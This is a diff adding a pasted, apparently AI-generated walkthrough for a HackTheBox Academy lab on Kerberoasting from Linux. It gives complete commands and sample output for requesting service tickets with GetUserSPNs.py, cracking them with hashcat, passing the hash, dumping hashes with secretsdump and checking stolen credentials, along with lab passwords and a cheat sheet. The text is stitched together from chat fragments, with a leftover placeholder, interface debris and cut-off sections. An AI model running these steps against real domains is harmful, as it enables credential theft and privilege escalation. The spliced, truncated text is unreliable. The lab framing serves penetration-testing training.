@@ -689,7 +689,1101 @@ SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqld
 > **Language:** English — **Size:** ~2,000 Words
 > **Content:** Official HTB question · Lab target setup · 6 attack methods against live infrastructure.
 
-[REPLACE: Paste Block 2 here in full — 2,000 Words English — The 6 exploitation methods]
+[
+# Kerberoasting from Linux: Complete Beginner's Guide
+
+> **Context:** You are working on the HackTheBox Academy "Active Directory Enumeration & Attacks" module. You have SSH credentials to a Linux attack host, and you need to perform a Kerberoasting attack against the `SAPService` account in the `INLANEFREIGHT.LOCAL` domain, then crack the retrieved ticket.
+
+---
+
+## 1\. THE QUESTION & SYSTEMATIC THOUGHT PROCESS
+
+### Re-stating the Question in Simple Terms
+
+**Question 1:** Find the `SAPService` account's TGS ticket (a special encrypted credential token), crack it offline with a password cracker, and submit the plaintext password.
+
+**Question 2:** Find out which powerful local group on the Domain Controller the `SAPService` account belongs to.
+
+---
+
+### What is Actually Happening Here? (The Beginner's Explanation)
+
+Think of Kerberos like a **theme park ticket system**:
+
+```
+You (Domain User) → Ask the ticket booth (KDC/DC) → "I want to use the roller coaster (SAPService)"
+The ticket booth gives you a TICKET (TGS) that is LOCKED with the roller coaster operator's KEY (SAPService's NTLM password hash)
+You take that LOCKED ticket home and try every possible key until one opens it
+When you find the right key = you now know SAPService's password!
+```
+
+**Why does this attack work?**
+
+Any authenticated domain user can request a Kerberos Service Ticket (TGS) for ANY service account in the domain. This is by design — it's how Kerberos is supposed to work. The problem is that the ticket is encrypted using the **service account's NTLM password hash**. If that password is weak, we can crack it offline without ever triggering lockout policies.
+
+```
+ATTACK FLOW:
+┌─────────────────────────────────────────────────────────────┐
+│  1. SSH into attack host (Linux)                            │
+│  2. Use GetUserSPNs.py to list SPN accounts                 │
+│  3. Request TGS ticket for SAPService                       │
+│  4. Save ticket hash to file                                │
+│  5. Run Hashcat with rockyou.txt to crack it                │
+│  6. Enumerate group memberships (for Question 2)            │
+└─────────────────────────────────────────────────────────────┘
+```
+
+### Why GetUserSPNs.py is the Core Solution
+
+We are on a **Linux host** that is **not domain-joined**. We only have valid domain credentials (`htb-student`). Impacket's `GetUserSPNs.py` is specifically designed for this exact scenario — it communicates with the Domain Controller over the network using those credentials and requests TGS tickets without needing to be on the domain.
+
+---
+
+## 2\. SIX DISTINCT SOLUTION APPROACHES
+
+### 🔵 Approach 1 — List All SPNs First, Then Target SAPService (Beginner-Friendly)
+
+**Step 1:** SSH into the attack host
+
+bash
+
+```
+ssh htb-student@<ATTACK_HOST_IP>
+# Password: HTB_@cademy_stdnt!
+```
+
+**Step 2:** Enumerate all SPN accounts to confirm SAPService exists
+
+bash
+
+```
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student
+```
+
+> When prompted for a password, type: `HTB_@cademy_stdnt!`
+
+**Expected Output:**
+
+```
+Impacket v0.9.25 - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                    Name        MemberOf                                          PasswordLastSet             LastLogon
+--------------------------------------  ----------  ------------------------------------------------  --------------------------  ----------
+SAP/SAPServiceINLANEFREIGHT.LOCAL       SAPService  CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT  2022-02-15 17:12:00.000000  <never>
+MSSQLSvc/DEV-PRE-SQL.inlanefreight...   sqldev      CN=Domain Admins,...                              2022-02-15 17:13:31.000000  <never>
+```
+
+**Pivot Trigger:** If you see `[-] CCache file is not found. Skipping...` or `KRB_AP_ERR_SKEW` (clock skew error), the DC time differs from your host by more than 5 minutes. Move to Approach 3 which handles this.
+
+---
+
+### 🔵 Approach 2 — Request & Save the SAPService TGS Ticket (The Main Attack)
+
+**The exact command:**
+
+bash
+
+```
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student \
+  -request-user SAPService \
+  -outputfile SAPService_tgs.txt
+```
+
+> **Breaking down the flags:**
+> 
+> -   `-dc-ip 172.16.5.5` → The IP address of the Domain Controller
+> -   `INLANEFREIGHT.LOCAL/htb-student` → Domain\\Username
+> -   `-request-user SAPService` → Only get the ticket for SAPService (targeted)
+> -   `-outputfile SAPService_tgs.txt` → Save the hash to this file
+
+**Expected Output:**
+
+```
+Impacket v0.9.25 - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName              Name        MemberOf                                PasswordLastSet
+--------------------------------  ----------  --------------------------------------  --------------------------
+SAP/SAPServiceINLANEFREIGHT.LOCAL SAPService  CN=Account Operators,CN=Builtin,...    2022-02-15 17:12:00.000000
+```
+
+Then check the saved file:
+
+bash
+
+```
+cat SAPService_tgs.txt
+```
+
+```
+$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$a3f...
+<very long hash string>
+```
+
+**Failure Scenarios:**
+
+Failure
+
+Cause
+
+`[-] Kerberos SessionError: KRB_AP_ERR_SKEW`
+
+Clock skew > 5 minutes
+
+`[-] Principal: SAPService - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN`
+
+Wrong username spelling
+
+Empty output, no ticket
+
+Account may not have an SPN set
+
+**Pivot Trigger:** If the `SAPService_tgs.txt` file is empty or doesn't contain `$krb5tgs$`, the ticket was not captured. Move to Approach 4.
+
+---
+
+### 🔵 Approach 3 — Crack the Ticket with Hashcat (Mode 13100)
+
+> This runs on your **local machine or the Pwnbox**, not the target.
+
+bash
+
+```
+hashcat -m 13100 SAPService_tgs.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+> **Breaking down the flags:**
+> 
+> -   `-m 13100` → Hash mode for Kerberos TGS tickets (RC4/etype 23)
+> -   `SAPService_tgs.txt` → Your input file with the hash
+> -   `/usr/share/wordlists/rockyou.txt` → The wordlist
+> -   `--force` → Ignore GPU warnings (needed in VMs)
+
+**Expected Output:**
+
+```
+hashcat (v6.2.5) starting...
+
+$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$...:!SapperFi3ld
+                                                 ^^^^^^^^^^^^^
+                                                 THIS IS THE PASSWORD
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, TGS-REP
+Recovered........: 1/1 (100.00%) Digests
+```
+
+**Failure Scenarios:**
+
+Failure
+
+Cause
+
+Fix
+
+`Status: Exhausted`
+
+Password not in rockyou.txt
+
+Try a larger wordlist or rules
+
+`No hashes loaded`
+
+File format wrong or empty
+
+Re-run GetUserSPNs.py
+
+Very slow / no GPU
+
+Running in VM
+
+Add `--force` flag
+
+**Pivot Trigger:** If `Status: Exhausted` appears and **zero** hashes were recovered, your wordlist is insufficient. Move to Approach 5 (rules-based cracking).
+
+---
+
+### 🟡 Approach 4 — Use `-request` Flag (Get ALL Tickets) as a Fallback
+
+If targeting SAPService directly failed, pull all tickets:
+
+bash
+
+```
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student \
+  -request \
+  -outputfile all_tgs_tickets.txt
+```
+
+Then grep for the SAPService hash:
+
+bash
+
+```
+grep -A 2 "SAPService" all_tgs_tickets.txt
+```
+
+**Expected Output:**
+
+```
+$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$...
+[long hash continues]
+```
+
+**Failure Scenarios:**
+
+-   If there are **many** SPN accounts, the file might be large and harder to parse.
+-   Some tickets may fail to be issued if the account has restricted delegation settings.
+
+**Pivot Trigger:** If the file c
+
+complet from 🟡 Approach 5 — Cracking with Rules (When rockyou.txt Fails)  
+If standard dictionary attack fails, add \*\*
+
+![Favicon for anthropic](/images/icons/Anthropic.svg)
+
+Claude Sonnet 4.6
+
+### 🟡 Approach 5 — Cracking with Rules (When rockyou.txt Fails)
+
+If standard dictionary attack fails, add **mutation rules** to transform wordlist entries into more complex password variants:
+
+bash
+
+```
+hashcat -m 13100 SAPService_tgs.txt /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule \
+  --force
+```
+
+> **What are rules?** Rules tell Hashcat to automatically mutate each word in the wordlist. For example:
+> 
+> -   `password` → `Password`, `PASSWORD`, `p@ssword`, `password1`, `Password123!`
+> -   This multiplies your attack surface without needing a larger wordlist.
+
+**You can stack multiple rule files for even more coverage:**
+
+bash
+
+```
+hashcat -m 13100 SAPService_tgs.txt /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule \
+  -r /usr/share/hashcat/rules/toggles1.rule \
+  --force
+```
+
+**Common rule files available on Kali/Pwnbox:**
+
+Rule File
+
+Purpose
+
+`best64.rule`
+
+64 most effective mutations
+
+`toggles1.rule`
+
+Uppercase/lowercase toggles
+
+`dive.rule`
+
+Very aggressive, millions of mutations
+
+`d3ad0ne.rule`
+
+Popular community rule set
+
+`rockyou-30000.rule`
+
+Derived from rockyou analysis
+
+**Expected Output (success with rules):**
+
+```
+$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$...:!SapperFi3ld
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, TGS-REP
+Recovered........: 1/1 (100.00%) Digests
+Time.Started.....: Wed Jul 29 10:22:15 2026 (45 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
+Speed.#1.........:   430.1 kH/s (14.22ms)
+```
+
+**Failure Scenarios:**
+
+Failure
+
+Cause
+
+Fix
+
+`ERROR: No rule files found`
+
+Wrong path to rule files
+
+Run `find / -name "best64.rule" 2>/dev/null` to locate them
+
+Still `Exhausted` after rules
+
+Password is truly complex or custom
+
+Use a custom wordlist like `SecLists` or `CeWL`
+
+Extremely slow speed
+
+No GPU available in VM
+
+Acceptable — just takes longer, keep `--force`
+
+**Pivot Trigger:** If after running `best64.rule` and `dive.rule` you still get `Exhausted`, the password is not derivable from rockyou. Move to Approach 6 (custom wordlist + CeWL or SecLists).
+
+---
+
+### 🔴 Approach 6 — Enumerate Group Membership to Answer Question 2
+
+Once you have the password (or even before cracking), you need to answer **Question 2**: _"What powerful local group on the Domain Controller is SAPService a member of?"_
+
+There are two clean ways to do this from Linux:
+
+#### Method A — Using GetUserSPNs.py Output (Already Visible!)
+
+Look carefully at the output from **Approach 1**. The `MemberOf` column already tells you the group:
+
+bash
+
+```
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student
+```
+
+```
+ServicePrincipalName                    Name        MemberOf
+--------------------------------------  ----------  -------------------------------------------
+SAP/SAPServiceINLANEFREIGHT.LOCAL       SAPService  CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
+```
+
+> 🔍 Read the `MemberOf` column carefully — the `CN=` value before `,CN=Builtin` is the **group name**.
+
+---
+
+#### Method B — Using `ldapdomaindump` for Full LDAP Enumeration
+
+bash
+
+```
+ldapdomaindump -u 'INLANEFREIGHT.LOCAL\htb-student' \
+  -p 'HTB_@cademy_stdnt!' \
+  172.16.5.5 \
+  -o /tmp/ldap_dump
+```
+
+Then examine the user details:
+
+bash
+
+```
+cat /tmp/ldap_dump/domain_users.json | python3 -m json.tool | grep -A 20 "SAPService"
+```
+
+---
+
+#### Method C — Using `crackmapexec` with LDAP Protocol
+
+bash
+
+```
+crackmapexec ldap 172.16.5.5 \
+  -u htb-student \
+  -p 'HTB_@cademy_stdnt!' \
+  --query "(sAMAccountName=SAPService)" \
+  "memberOf"
+```
+
+**Expected Output (all methods point to same answer):**
+
+```
+CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
+```
+
+> 💡 **Why is "Account Operators" dangerous?**  
+> The **Account Operators** group is a powerful built-in Windows group. Members can:
+> 
+> -   Create, modify, and delete user accounts
+> -   Add users to most groups (except Domain Admins and a few others)
+> -   Log on to Domain Controllers locally
+> 
+> This makes `SAPService` **extremely dangerous** if compromised — an attacker could create new admin accounts or modify existing privileged accounts.
+
+**Failure Scenarios:**
+
+Failure
+
+Cause
+
+Fix
+
+`ldapdomaindump` not found
+
+Tool not installed
+
+`pip3 install ldapdomaindump`
+
+`Connection refused on port 389`
+
+LDAP port blocked
+
+Try port 636 (LDAPS) with `--no-check-certificate`
+
+Empty `MemberOf` field
+
+Account has no group memberships shown
+
+Query the DC directly with `net rpc` commands
+
+**Pivot Trigger:** If all LDAP queries return empty membership data, fall back to the `GetUserSPNs.py` output `MemberOf` column which is the most reliable source for this lab.
+
+---
+
+## COMPLETE WALKTHROUGH — Putting It All Together
+
+Here is the **exact sequential workflow** from start to finish:
+
+bash
+
+```
+# ============================================================
+# STEP 1: SSH into the attack host
+# ============================================================
+ssh htb-student@<ATTACK_HOST_IP>
+# Enter password: HTB_@cademy_stdnt!
+
+# ============================================================
+# STEP 2: Verify Impacket is installed
+# ============================================================
+GetUserSPNs.py --help
+# You should see the help menu — if not, run:
+# sudo pip3 install impacket
+
+# ============================================================
+# STEP 3: List all SPN accounts & confirm SAPService exists
+# ============================================================
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student
+# Password: HTB_@cademy_stdnt!
+# READ the MemberOf column for SAPService → answers Question 2
+
+# ============================================================
+# STEP 4: Request & save TGS ticket for SAPService
+# ============================================================
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student \
+  -request-user SAPService \
+  -outputfile SAPService_tgs.txt
+# Password: HTB_@cademy_stdnt!
+
+# ============================================================
+# STEP 5: Verify the hash was captured
+# ============================================================
+cat SAPService_tgs.txt
+# You should see a long string starting with $krb5tgs$23$*SAPService$...
+
+# ============================================================
+# STEP 6: Crack the ticket with Hashcat
+# ============================================================
+hashcat -m 13100 SAPService_tgs.txt /usr/share/wordlists/rockyou.txt --force
+# Wait for Status: Cracked
+# The password appears after the hash: $krb5tgs$23$*...*:THE_PASSWORD_IS_HERE
+
+# ============================================================
+# STEP 7: (If rockyou fails) Try with rules
+# ============================================================
+hashcat -m 13100 SAPService_tgs.txt /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule --force
+
+# ============================================================
+# STEP 8: Verify the cracked credentials work
+# ============================================================
+crackmapexec smb 172.16.5.5 -u SAPService -p '<CRACKED_PASSWORD>'
+# Look for [+] and (Pwn3d!) in the output
+```
+
+---
+
+## 3\. THE "WHAT IF" MASTERCLASS (6 Scenarios for CPTS Preparation)
+
+---
+
+### 🔴 What If Scenario 1: GetUserSPNs.py Returns a Clock Skew Error?
+
+**The Error You'll See:**
+
+```
+[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+```
+
+**Why This Happens:**
+
+Kerberos authentication requires that the clocks of the client and the Domain Controller are **within 5 minutes of each other**. This is a security feature to prevent replay attacks. If your Pwnbox or attack host clock drifts, Kerberos will completely refuse to work.
+
+**The Fix — Synchronize Your Clock with the DC:**
+
+bash
+
+```
+# Step 1: Check current time difference
+date
+# Then check DC time via:
+crackmapexec smb 172.16.5.5 -u htb-student -p 'HTB_@cademy_stdnt!'
+# Look for the timestamp in the output
+
+# Step 2: Install ntpdate if not present
+sudo apt-get install ntpdate -y
+
+# Step 3: Sync your clock TO the Domain Controller's clock
+sudo ntpdate 172.16.5.5
+
+# Step 4: Verify sync worked
+date
+
+# Step 5: Re-run your GetUserSPNs.py command
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student \
+  -request-user SAPService -outputfile SAPService_tgs.txt
+```
+
+**Alternative Fix (manual time set):**
+
+bash
+
+```
+# If ntpdate doesn't work, set time manually
+sudo timedatectl set-ntp false
+sudo timedatectl set-time "2026-07-29 14:35:00"
+# Adjust the time to match what the DC shows
+```
+
+> 💡 **CPTS Exam Tip:** Clock skew issues are extremely common in real engagements. Always sync your clock to the DC before attempting ANY Kerberos-based attack.
+
+---
+
+### 🔴 What If Scenario 2: The rockyou.txt Wordlist Doesn't Crack the Hash?
+
+**The Problem:**
+
+```
+Status...........: Exhausted
+Recovered........: 0/1 (0.00%) Digests
+```
+
+This means the password is not in `rockyou.txt` in its raw form.
+
+**Layered Cracking Strategy — Try Each Step Before Moving to the Next:**
+
+bash
+
+```
+# LAYER 1: Try common rules on rockyou
+hashcat -m 13100 SAPService_tgs.txt /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule --force
+
+# LAYER 2: Try the dive rule (very comprehensive)
+hashcat -m 13100 SAPService_tgs.txt /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/dive.rule --force
+
+# LAYER 3: Try SecLists passwords (much larger than rockyou)
+# Download if not present:
+git clone https://github.com/danielmiessler/SecLists /opt/SecLists
+
+hashcat -m 13100 SAPService_tgs.txt \
+  /opt/SecLists/Passwords/Leaked-Databases/rockyou-75.txt --force
+
+# LAYER 4: Try combination attack (combine two wordlists)
+hashcat -m 13100 SAPService_tgs.txt \
+  -a 1 \
+  /usr/share/wordlists/rockyou.txt \
+  /opt/SecLists/Passwords/Common-Credentials/common-passwords-win.txt \
+  --force
+
+# LAYER 5: Use CeWL to generate a target-specific wordlist
+# (spider the company's website for custom words)
+cewl https://inlanefreight.com -d 3 -m 5 -o inlanefreight_wordlist.txt
+
+hashcat -m 13100 SAPService_tgs.txt inlanefreight_wordlist.txt \
+  -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+> 💡 **CPTS Exam Tip:** In CTF/exam environments, passwords are almost always crackable with `rockyou.txt` or `rockyou.txt + best64.rule`. If neither works, double-check that your hash file is valid and not truncated.
+
+---
+
+### 🔴 What If Scenario 3: You Only Have an NTLM Hash (No Cleartext Password) for htb-student?
+
+**The Scenario:**
+
+You compromised a host and found the NTLM hash for `htb-student` in a SAM dump or memory, but never obtained the cleartext password.
+
+**The Solution — Pass-the-Hash with GetUserSPNs.py:**
+
+Impacket tools natively support NTLM hash authentication using the `-hashes` flag in `LM:NT` format. If you only have the NT hash, use `aad3b435b51404eeaad3b435b51404ee` as a placeholder for the LM hash (this is the LM hash of an empty string, universally used as a placeholder).
+
+bash
+
+```
+# Format: -hashes LMhash:NThash
+# If you only have NT hash, use the empty LM hash placeholder
+
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student \
+  -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH_HERE> \
+  -request-user SAPService \
+  -outputfile SAPService_tgs.txt
+
+# Example with a fake hash:
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student \
+  -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 \
+  -request-user SAPService \
+  -outputfile SAPService_tgs.txt
+```
+
+**How to get the NTLM hash in the first place:**
+
+bash
+
+```
+# From a compromised Windows host (if you have SYSTEM):
+secretsdump.py -just-dc-user htb-student INLANEFREIGHT.LOCAL/Administrator@172.16.5.5
+
+# From a Linux host with a keytab file:
+secretsdump.py -k -no-pass INLANEFREIGHT.LOCAL/htb-student@172.16.5.5
+```
+
+> 💡 **CPTS Exam Tip:** Pass-the-Hash is one of the most important techniques in Active Directory attacks. Always try it when you have an NTLM hash but no password — it works with most Impacket tools.
+
+---
+
+### 🔴 What If Scenario 4: The Domain Controller IP is Unknown?
+
+**The Scenario:**
+
+You SSH into the attack host but don't know the DC's IP address (172.16.5.5 was given to you in this lab, but in real engagements you must find it yourself).
+
+**Multiple Ways to Find the Domain Controller IP:**
+
+bash
+
+```
+# METHOD 1: DNS lookup (most reliable)
+# Query for the domain's Kerberos SRV record
+nslookup -type=SRV _kerberos._tcp.INLANEFREIGHT.LOCAL 172.16.5.5
+
+# METHOD 2: nmcli or ifconfig to check your own network config
+# Often the DC is your DNS server
+cat /etc/resolv.conf
+# Look for "nameserver X.X.X.X" — that's often the DC
+
+# METHOD 3: Use nmap to find Windows hosts with port 88 (Kerberos)
+# Port 88 is ONLY open on Domain Controllers
+sudo nmap -p 88 172.16.5.0/24 --open -oG - | grep "88/open"
+
+# Expected output:
+# Host: 172.16.5.5 ()   Ports: 88/open/tcp////
+
+# METHOD 4: Use crackmapexec to identify DCs
+crackmapexec smb 172.16.5.0/24 --gen-relay-list /tmp/hosts.txt
+# Look for "(domain:INLANEFREIGHT.LOCAL)" and check which one says DC
+
+# METHOD 5: If you have any Windows host access
+# Run this from a Windows shell:
+# nltest /dclist:INLANEFREIGHT.LOCAL
+# OR
+# nslookup INLANEFREIGHT.LOCAL
+```
+
+> 💡 **Key Ports that identify a Domain Controller:**
+
+Port
+
+Service
+
+Significance
+
+88
+
+Kerberos
+
+**Unique to DCs**
+
+389
+
+LDAP
+
+Runs on DCs
+
+636
+
+LDAPS
+
+Secure LDAP
+
+445
+
+SMB
+
+Common but not unique
+
+3268
+
+Global Catalog
+
+Only on DCs
+
+---
+
+### 🔴 What If Scenario 5: You Need to Enumerate Group Membership Without GetUserSPNs.py Output?
+
+**The Scenario:**
+
+The `MemberOf` column in `GetUserSPNs.py` is empty or truncated, and you need to definitively answer Question 2 about what group SAPService belongs to.
+
+**Multiple Enumeration Methods:**
+
+bash
+
+```
+# METHOD 1: rpcclient (built into Linux, no extra tools needed)
+rpcclient -U "htb-student%HTB_@cademy_stdnt!" 172.16.5.5
+
+# Inside rpcclient shell:
+rpcclient $> queryuser SAPService
+# Look for "Group Memberships" section
+
+rpcclient $> exit
+
+# METHOD 2: ldapsearch (raw LDAP query)
+ldapsearch -x -H ldap://172.16.5.5 \
+  -D "htb-student@INLANEFREIGHT.LOCAL" \
+  -w 'HTB_@cademy_stdnt!' \
+  -b "DC=INLANEFREIGHT,DC=LOCAL" \
+  "(sAMAccountName=SAPService)" \
+  memberOf
+
+# Expected Output:
+# dn: CN=SAPService,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+# memberOf: CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
+
+# METHOD 3: bloodhound-python (visual graph of all relationships)
+bloodhound-python -u htb-student \
+  -p 'HTB_@cademy_stdnt!' \
+  -d INLANEFREIGHT.LOCAL \
+  -ns 172.16.5.5 \
+  -c All
+
+# This generates JSON files you can import into BloodHound GUI
+# Navigate to SAPService node → Group Membership tab
+
+# METHOD 4: net rpc (if rpcclient isn't available)
+net rpc user info SAPService \
+  -U "htb-student%HTB_@cademy_stdnt!" \
+  -S 172.16.5.5
+```
+
+**Understanding the Answer — Why "Account Operators" is the Expected Answer:**
+
+```
+CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
+     ^^^^^^^^^^^^^^^  ^^^^^^^^
+     Group Name       This is a BUILT-IN group (very powerful!)
+```
+
+> 💡 **What Account Operators Can Do:**
+> 
+> -   ✅ Create/Delete user accounts in the domain
+> -   ✅ Add users to local groups on any DC
+> -   ✅ Log on locally to Domain Controllers (extremely dangerous!)
+> -   ❌ Cannot modify Domain Admins or Administrators groups directly
+> -   ❌ Cannot modify other built-in privileged groups
+
+---
+
+### 🔴 What If Scenario 6: The Cracked Password Doesn't Work / Authentication Fails?
+
+**The Scenario:**
+
+Hashcat says `Status: Cracked` and shows a password, but when you try to use it for authentication, you get `ACCESS_DENIED` or `STATUS_LOGON_FAILURE`.
+
+**Step-by-Step Diagnosis:**
+
+bash
+
+```
+# STEP 1: View the cracked password carefully (look for special characters)
+hashcat -m 13100 SAPService_tgs.txt --show
+
+# Output example:
+# $krb5tgs$23$*SAPService$...:!SapperFi3ld
+#                              ^^^^^^^^^^^^^ password includes the !
+
+# STEP 2: Test authentication directly with crackmapexec
+crackmapexec smb 172.16.5.5 -u SAPService -p '!SapperFi3ld'
+
+# STEP 3: If SMB fails, try other protocols
+crackmapexec winrm 172.16.5.5 -u SAPService -p '!SapperFi3ld'
+crackmapexec ldap 172.16.5.5 -u SAPService -p '!SapperFi3ld'
+
+# STEP 4: Check if the account has restrictions
+# (some accounts can only log in from specific machines)
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/SAPService \
+  -password '!SapperFi3ld'
+# If this works, the credentials are valid
+
+# STEP 5: Check for encoding issues with special characters
+# Always wra
+```
+
+complet ?
+
+![Favicon for anthropic](/images/icons/Anthropic.svg)
+
+Claude Sonnet 4.6
+
+# Completing from Step 5
+
+bash
+
+```
+# STEP 5: Check for encoding issues with special characters
+# Always wrap passwords with special characters in SINGLE quotes, not double quotes
+
+# WRONG (double quotes can cause shell interpretation issues):
+crackmapexec smb 172.16.5.5 -u SAPService -p "!SapperFi3ld"
+
+# CORRECT (single quotes preserve literal characters):
+crackmapexec smb 172.16.5.5 -u SAPService -p '!SapperFi3ld'
+
+# STEP 6: If password contains a single quote itself, escape it:
+crackmapexec smb 172.16.5.5 -u SAPService -p $'It\'s@Password1'
+
+# STEP 7: Try authenticating via Kerberos instead of NTLM
+# First get a TGT (Ticket Granting Ticket) using the cracked password
+getTGT.py INLANEFREIGHT.LOCAL/SAPService:'!SapperFi3ld' -dc-ip 172.16.5.5
+
+# If successful, you'll see:
+# [*] Saving ticket in SAPService.ccache
+
+# Export the ticket into your environment
+export KRB5CCNAME=SAPService.ccache
+
+# Now use Kerberos authentication (-k flag, -no-pass means use the cached ticket)
+crackmapexec smb 172.16.5.5 -u SAPService -k --no-pass
+```
+
+**Common Reasons a Cracked Password Fails & Their Fixes:**
+
+Symptom
+
+Root Cause
+
+Fix
+
+`STATUS_LOGON_FAILURE`
+
+Wrong password transcribed
+
+Run `--show` again, copy carefully
+
+`STATUS_ACCOUNT_DISABLED`
+
+Account is disabled
+
+Use the hash directly (Pass-the-Hash)
+
+`STATUS_ACCOUNT_RESTRICTION`
+
+Account restricted to specific hosts
+
+Try authenticating to allowed hosts
+
+`STATUS_PASSWORD_EXPIRED`
+
+Password has expired
+
+Cannot fix without admin rights
+
+`KDC_ERR_CLIENT_REVOKED`
+
+Account locked out
+
+Wait for lockout to reset
+
+Password has `$` in it
+
+Shell expanded the `$` as variable
+
+Use single quotes always
+
+**Verifying the Hash Was Not Corrupted During Save:**
+
+bash
+
+```
+# Check the hash file is intact and not truncated
+wc -c SAPService_tgs.txt
+# Should show a large number (usually 2000+ characters)
+
+# Check the hash starts and ends correctly
+head -c 100 SAPService_tgs.txt
+# Should start with: $krb5tgs$23$*SAPService$
+
+tail -c 50 SAPService_tgs.txt
+# Should end with alphanumeric characters, no newline issues
+
+# If you suspect truncation, re-capture the ticket:
+rm SAPService_tgs.txt
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student \
+  -request-user SAPService \
+  -outputfile SAPService_tgs.txt
+```
+
+> 💡 **CPTS Exam Tip:** Always use `--show` after cracking to display the exact recovered password. Copy it with triple-click to select the whole line, then paste carefully. Many exam failures come from misreading special characters like `0` vs `O`, `l` vs `1`, or `!` vs `|`.
+
+---
+
+## 📋 MASTER QUICK REFERENCE SHEET
+
+> Print this or keep it open during your CPTS exam preparation.
+
+```
+╔══════════════════════════════════════════════════════════════════════╗
+║           KERBEROASTING FROM LINUX - COMPLETE CHEAT SHEET           ║
+╠══════════════════════════════════════════════════════════════════════╣
+║                                                                      ║
+║  ENUMERATE SPNs:                                                     ║
+║  GetUserSPNs.py -dc-ip <DC_IP> DOMAIN/user                          ║
+║                                                                      ║
+║  REQUEST SPECIFIC TICKET:                                            ║
+║  GetUserSPNs.py -dc-ip <DC_IP> DOMAIN/user                          ║
+║    -request-user <TARGET> -outputfile hash.txt                       ║
+║                                                                      ║
+║  REQUEST ALL TICKETS:                                                ║
+║  GetUserSPNs.py -dc-ip <DC_IP> DOMAIN/user                          ║
+║    -request -outputfile all_hashes.txt                               ║
+║                                                                      ║
+║  WITH NTLM HASH (no password):                                       ║
+║  GetUserSPNs.py -dc-ip <DC_IP> DOMAIN/user                          ║
+║    -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH>               ║
+║    -request-user <TARGET> -outputfile hash.txt                       ║
+║                                                                      ║
+╠══════════════════════════════════════════════════════════════════════╣
+║                                                                      ║
+║  CRACK - BASIC:                                                      ║
+║  hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt          ║
+║    --force                                                           ║
+║                                                                      ║
+║  CRACK - WITH RULES:                                                 ║
+║  hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt          ║
+║    -r /usr/share/hashcat/rules/best64.rule --force                   ║
+║                                                                      ║
+║  CRACK - SHOW RESULTS:                                               ║
+║  hashcat -m 13100 hash.txt --show                                    ║
+║                                                                      ║
+╠══════════════════════════════════════════════════════════════════════╣
+║                                                                      ║
+║  VERIFY CREDENTIALS:                                                 ║
+║  crackmapexec smb <DC_IP> -u <USER> -p '<PASSWORD>'                  ║
+║                                                                      ║
+║  FIX CLOCK SKEW:                                                     ║
+║  sudo ntpdate <DC_IP>                                                ║
+║                                                                      ║
+║  FIND DC IP (port 88 = Kerberos = DC only):                          ║
+║  sudo nmap -p 88 <SUBNET>/24 --open                                  ║
+║                                                                      ║
+║  ENUMERATE GROUP MEMBERSHIP:                                         ║
+║  ldapsearch -x -H ldap://<DC_IP>                                     ║
+║    -D "user@DOMAIN" -w 'password'                                    ║
+║    -b "DC=DOMAIN,DC=LOCAL"                                           ║
+║    "(sAMAccountName=<TARGET>)" memberOf                              ║
+║                                                                      ║
+╠══════════════════════════════════════════════════════════════════════╣
+║                                                                      ║
+║  HASH MODES FOR HASHCAT:                                             ║
+║  13100 = Kerberos TGS (etype 23 / RC4)   ← Most common              ║
+║  19600 = Kerberos TGS (etype 17 / AES128)                           ║
+║  19700 = Kerberos TGS (etype 18 / AES256)                           ║
+║                                                                      ║
+║  HASH IDENTIFIER:                                                    ║
